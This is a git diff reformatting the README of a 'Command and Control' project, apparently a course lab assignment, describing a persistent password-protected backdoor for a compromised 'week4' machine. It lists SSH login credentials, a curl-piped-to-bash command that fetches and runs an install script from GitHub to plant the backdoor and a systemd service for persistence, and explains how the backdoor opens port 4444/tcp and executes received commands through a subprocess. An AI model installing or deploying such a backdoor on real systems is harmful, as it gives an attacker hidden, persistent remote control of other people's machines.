@@ -1,7 +1,15 @@
-Instructions
+# Command and Control
+
+A simple backdoor that provides the user persistent password-protected access to a previously compromised machine.
+
+## Installing and running the server script on the week4 machine
+
 Logging into the week4 machine:
 ssh into the week4 machine using this command:
-	ssh user@10.0.2.5
+
+```bash
+ssh user@10.0.2.5
+```
 
 The password for the machine is:
 	hill
@@ -13,23 +21,29 @@ then type ‘cd’ in order to change into the root directory
 Installing and running the server script on the week4 machine:
 Run the following command which will install the backdoor to the machine. Only 2 files will be installed: the script to run the server from GitHub directly, and the systemd service to ensure persistence (explained more in a further section).
 
+```bash
 curl -s https://raw.githubusercontent.com/athulnair02/command-and-control/main/install_backdoor | bash
+```
 
-Source Code
-GitHub with all scripts
-Installing and running the client script on your local machine:
+## Installing and running the client script on your local machine
+
 In any spot on the attacking machine add the file:
 
 client.py from the GitHub
 
 Once you’ve done this, you can run the client script at any time using:
-	python client.py
-	
-or
-	
-python3 client.py
 
-How the backdoor works:
+```bash
+python client.py
+```	
+or
+
+```bash	
+python3 client.py
+```
+
+## How the backdoor works
+
 How our backdoor addresses the 5 requirements:
 Explanation of how our backdoor provides remote shell access:
 The backdoor is essentially a shell in which the target machine reveals port 4444/tcp in the firewall and listens for a connection from the network. The python script on the target side is waiting for a connection, and once accepted and authorized through a password, it receives commands from the attacking machine through TCP and executes them through a subprocess. The output from the command is sent back to the attacking machine through the established connection.
